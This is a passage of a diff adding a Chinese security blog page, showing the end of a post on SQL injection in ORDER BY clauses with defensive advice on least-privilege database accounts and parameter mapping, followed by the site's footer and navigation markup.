+3、最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。</p>
+<p>对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。</p>
+<p>以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。</p>
+<p>微信扫一扫，关注该公众号</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode-20230814164512823" alt="img" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode-20230814164512823?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode-20230814164512823?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/qrcode-20230814164512823?size=large 2x" data-title="img" class="suffix-invalid suffix-invalid__small suffix-invalid__large" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-07-28 15:20:04">更新于 2023-07-28&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sqli/" class="post-tag" title="标签 - SQLi">SQLi</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="prev" title="018-SQL注入之GroupBy位置点注入"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>018-SQL注入之GroupBy位置点注入</a><a href="/posts/revshell/" class="post-nav-item" rel="next" title="020-RevShell：一款好用的生成反弹Shell命令的工具">020-RevShell：一款好用的生成反弹Shell命令的工具<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
